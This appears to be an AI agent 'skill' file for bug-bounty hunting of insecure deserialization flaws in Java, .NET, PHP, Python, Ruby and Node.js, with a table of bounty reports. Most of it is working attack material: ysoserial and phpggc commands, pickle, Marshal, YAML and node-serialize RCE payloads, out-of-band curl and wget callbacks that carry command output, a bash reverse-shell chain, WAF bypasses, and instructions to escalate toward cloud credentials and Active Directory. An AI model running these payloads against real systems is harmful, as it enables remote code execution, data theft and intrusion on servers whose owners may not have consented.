---
name: hunt-deserialization
description: "Use this skill when you see serialized data in cookies/params/headers — Java `rO0` (base64 `aced0005`), PHP `O:N:` or `a:N:`, Python pickle `\\x80\\x04` magic, .NET ViewState `__VIEWSTATE=`, Ruby Marshal `\\x04\\x08`, Node.js `_$$ND_FUNC$$_` or `unserialize-javascript`. Load automatically when fingerprint shows Java (Spring, Struts, WebLogic, JBoss), .NET (ASP.NET, SharePoint, Exchange), PHP (Laravel, WordPress, Magento), Python (Django pickled session), or Rails. Only invoke if real impact potential exists — deserialization without a usable gadget chain is not a bounty."
type: hunt
---

# Hunt: INSECURE DESERIALIZATION

Untrusted-data → object reconstruction → arbitrary code execution. Almost always Critical (CVSS 9.8). The hard part is gadget chain construction; tools like ysoserial automate it for known libraries.

## Crown Jewel Targets
- Java app servers — WebLogic T3, JBoss `/invoker`, WebSphere SOAP, Jenkins CLI
- Spring apps with Apache Commons Collections 3.1/4.0, BeanShell, Groovy, Vaadin on classpath
- .NET ASP.NET ViewState with leaked `machineKey` (or `__VIEWSTATEGENERATOR` matches public CVE)
- PHP apps with `unserialize($_COOKIE[...])` and Monolog/Guzzle/Laravel/Symfony on classpath
- Python pickle in cookies / `pickle.loads` in cache / Celery tasks pickled
- Ruby on Rails session cookies with `Marshal.load` (CVE-2013-0156, CVE-2019-5420)
- Node.js with `node-serialize.unserialize()` accepting `_$$ND_FUNC$$_`

## Detection Signals
| Language | Magic / Signature |
|----------|-------------------|
| Java     | `aced 0005` hex / `rO0AB` base64 / `H4sI` (gzipped) |
| PHP      | `O:N:"ClassName":N:{...}` / `a:N:{...}` / `s:N:"..."` |
| Python pickle | `\x80\x04` (proto 4), `\x80\x02` (proto 2), `(dp0\n` |
| .NET BinaryFormatter | `AAEAAAD/////` base64 |
| .NET ViewState | param `__VIEWSTATE=`, often `/wEPDw...` |
| Ruby Marshal | `\x04\x08` (hex `0408`), base64 `BAh` |
| Node node-serialize | string `_$$ND_FUNC$$_` |
| YAML (Python) | `!!python/object/apply:os.system` |
| YAML (Ruby) | `!ruby/object:` |

Look in: cookies, hidden form fields, URL params, request body, custom headers, JMS messages, RMI calls (1099, 1098), T3 (7001), JNDI lookups.

## Attack Techniques

### 1. Java — ysoserial
```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://OAST/`whoami`' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaC...}|{base64,-d}|{bash,-i}' > payload.bin
java -jar ysoserial.jar Hibernate1 'wget http://OAST/x'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar URLDNS 'http://OAST'   ← blind detection probe (DNS only)
```
Gadgets to try in order: CommonsCollections5, CommonsCollections6, CommonsBeanutils1, Hibernate1, Spring1, JRMPClient (for blind via JRMPListener), URLDNS (detection).

Known CVE classes:
- CVE-2015-7501 Apache CommonsCollections
- CVE-2017-10271 WebLogic WLS-WSAT
- CVE-2017-5638 Struts2 (OGNL via Content-Type)
- CVE-2021-44228 Log4Shell (JNDI deserialization gadget)
- CVE-2022-22963/22965 Spring4Shell / Spring Cloud Function
- CVE-2023-22518 Confluence

### 2. .NET — ysoserial.net
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'whoami' -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'calc'
ysoserial.exe -g WindowsIdentity -f SoapFormatter -c 'cmd'
```
Formatters to try: BinaryFormatter, NetDataContractSerializer, SoapFormatter, LosFormatter (ViewState), ObjectStateFormatter, Json.Net (with TypeNameHandling != None), DataContractSerializer.

ViewState with known machineKey (badsecrets / blacklist3r):
```bash
python3 viewgen.py --webconfig web.config -m generate -p "cmd /c whoami"
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'whoami' \
  --path='/page.aspx' --apppath='/' \
  --decryptionalg='AES' --decryptionkey='HEXKEY' \
  --validationalg='HMACSHA256' --validationkey='HEXKEY'
```

### 3. PHP — POP chain
Find `__destruct`, `__wakeup`, `__toString`, `__call` magic methods in app source. Common gadgets:
- Monolog `RotatingFileHandler` → arbitrary file write
- Guzzle `FnStream` → arbitrary function call
- Laravel/Symfony — `phpggc` covers most
```bash
phpggc Laravel/RCE9 system 'id' -b           # base64
phpggc Monolog/RCE1 'curl OAST' -b
phpggc Symfony/RCE4 system 'id' -j -u        # url-encoded JSON
phpggc -l                                     # list all chains
```

### 4. Python — pickle
```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('curl http://OAST/`id`',))
print(base64.b64encode(pickle.dumps(E())).decode())
```
Test against: pickled session cookies, Celery (when `CELERY_TASK_SERIALIZER=pickle`), cached objects.

YAML `safe_load` is safe; `yaml.load` (PyYAML < 5.1 default) is RCE:
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["curl","OAST"]]
```

### 5. Ruby — Marshal / YAML / ERB
```ruby
# Marshal RCE (Universal RXX gadget — Rails ≥ 5.2, Ruby ≥ 2.x)
require 'erb'; e = ERB.allocate; e.instance_variable_set(:@src, 'system("id")')
e.instance_variable_set(:@filename, 'x'); e.instance_variable_set(:@lineno, 0)
payload = Base64.encode64(Marshal.dump([e, :result]))
```
Or use `universal-deserialization-gadget-chain` repo.

YAML:
```yaml
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::DependencyList
    specs:
      - !ruby/object:Gem::Source::SpecificFile
        spec: &id001
          !ruby/object:Gem::StubSpecification
          loaded_from: '|id 1>&2'
```

### 6. Node.js — node-serialize
```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl OAST',function(){})}()"}
```
Also vulnerable: `serialize-to-js`, `funcster`, older `lodash` template strings.

### 7. Blind detection (no error, no output)
- `URLDNS` Java gadget → DNS hit confirms vuln
- Sleep gadget — `phpggc -b ... 'sleep 10'` and time response
- OOB callback via curl/wget to Burp Collaborator / interactsh

## Payloads
```bash
# All-purpose OAST probe — paste into every serialized-looking blob
curl -s -d "$(java -jar ysoserial.jar URLDNS http://canary.oast.live | base64 -w0)" \
  -H 'Content-Type: application/x-java-serialized-object' https://target/endpoint

# Interactsh listener
interactsh-client -v
```

## Bypass Methods
- WAF blocks `aced 0005` → gzip the blob (`H4sI` magic), many parsers auto-decompress
- WAF blocks `O:` PHP magic → use `C:` (custom serialized) or array `a:` wrapping the object
- `__wakeup` sanity check (PHP < 5.6.25) → bypass with mismatched property count `O:4:"User":99:{...}`
- `unserialize($data, ['allowed_classes' => false])` — use `Phar://` deserialization gadget (any file read triggers it on `phar://path`)
- Json.Net TypeNameHandling restriction → use `$type` confusion via known whitelisted types

## Tools
```bash
ysoserial             # Java
ysoserial.net         # .NET
phpggc                # PHP
marshalsec            # Java JNDI/RMI/LDAP exploit chains
viewgen / blacksechck # .NET ViewState
badsecrets            # detect leaked secrets (machineKey, Flask SECRET_KEY)
freddy (Burp ext)     # auto-detect serialized formats
GadgetInspector       # find gadget chains in custom JARs
SerializationDumper   # parse Java serialized bytes
nuclei -t deserialization/
```

## Impact
- **Critical** — RCE confirmed (whoami output, OAST hit with code execution context, reverse shell)
- **High** — Confirmed deserialization with controllable type but no public gadget chain in classpath (still exploitable by motivated attacker)
- **Medium** — Detection only (URLDNS confirms class loading but no gadget) — usually triage rejects unless app is enterprise-critical

## Chain Potential
- Deserialization → RCE → cloud metadata → IAM privesc → full account takeover
- ViewState RCE → IIS app pool token theft → lateral to AD
- Pickle RCE in Celery worker → access to all queued task data (PII)
- Java JNDI gadget → if blocked outbound, chain with internal LDAP for in-network pivot
- Phar deserialization via file upload → RCE without direct unserialize call

## Fallback Chain
1. If `CommonsCollections5/6` fail, cycle through all 30+ ysoserial gadgets (CC1-7, Hibernate1-2, Spring1-2, Vaadin1, JBossInterceptors1, JSON1, MozillaRhino1-2, Click1, BeanShell1, Groovy1, JRMPClient, JRMPListener).
2. If no public gadget chain works, run GadgetInspector against the target's JARs (download via `/WEB-INF/lib` if leaked, or unpack the WAR/JAR) to discover a custom chain.
3. If serialized blob is encrypted/signed, check for leaked secrets (`badsecrets` against `machineKey`, Rails `secret_key_base`, Flask `SECRET_KEY`) — many are in public CVE databases.
4. If everything fails, switch to blind URLDNS detection to at least confirm the sink, then escalate to manual gadget hunting on the next session. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **Deserialization of untrusted data at redtube.com/media/hls** | Pornhub | $10,000 | H1 #1312641 |
| Kafka Connect RCE via JndiLoginModule (SASL JAAS) | Aiven Ltd | $5,000 | H1 #1529790 |
| C# Deserialization sinks (CodeQL queries) | GitHub Security Lab | $4,500 | H1 #1319270 |
| Java: Unsafe deserialization with Jackson | GitHub Security Lab | $4,500 | H1 #1287573 |
| Java: Unsafe deserialization in Spring exporters | GitHub Security Lab | $4,500 | H1 #1135877 |
| **CVE-2025-24813: RCE via Tomcat write-enabled default servlet** | Internet Bug Bounty | $4,323 | H1 #3031518 |
| Java CWE-502: Unsafe deserialization in 3 JSON frameworks | GitHub Security Lab | $1,800 | H1 #1368720 |
| Java: Unsafe RMI deserialization CodeQL | GitHub Security Lab | $1,800 | H1 #1241579 |
| Remote code execution on rubygems.org | RubyGems | $1,500 | H1 #274990 |
| **YAML loading in Kubernetes Java client → command execution** | Kubernetes | $1,000 | H1 #1167773 |
| CVE-2021-44228 log4shell on nps.acronis.com | Acronis | $1,000 | H1 #1425474 |
| Untrusted deserialization in newrelic.yml Java agent | New Relic | $768 | H1 #1109620 |
| Vanilla Forums domGetImages getimagesize Unserialize RCE | Vanilla | $600 | H1 #410882 |
| Vanilla Forums ImportController file_exists Unserialize RCE | Vanilla | $600 | H1 #410237 |
| Vanilla Forums Gdn_Format unserialize() RCE | Vanilla | $600 | H1 #407552 |

**PROVEN patterns** (3+ reports): PHP `unserialize()` on user-controlled blob (Vanilla x3), Java/Jackson `enableDefaultTyping` (GitHub SecLab x3), YAML loading without SafeLoader, Log4Shell/JNDI injection in any logged field.

## High-Value Chains (from Reports)

1. **Cookie/session blob → ysoserial gadget → RCE → AWS keys**
   - Pornhub Redtube (H1 #1312641, $10k) — deserialized parameter triggered chain, full server compromise.
2. **Log4Shell JNDI in any logged field → outbound LDAP → RCE**
   - Acronis (H1 #1425474, $1k) — User-Agent or any header logged by Log4j 2.x → JNDI to attacker LDAP → arbitrary class execution.
3. **YAML load() → Java instantiation → command execution**
   - Kubernetes (H1 #1167773, $1k) — Java client used unsafe YAML loader, attacker YAML triggered ProcessBuilder.
4. **JndiLoginModule SASL config injection → JNDI RCE**
   - Aiven Kafka Connect (H1 #1529790, $5k) — connector config accepted JAAS string, attacker pointed at LDAP, RCE.
5. **PHP unserialize() via cookie or POST → magic-method chain → webshell drop**
   - Vanilla Forums (H1 #410882/#410237/#407552, $600 each) — three independent unserialize sinks; Phar deserialization also viable via file_exists.
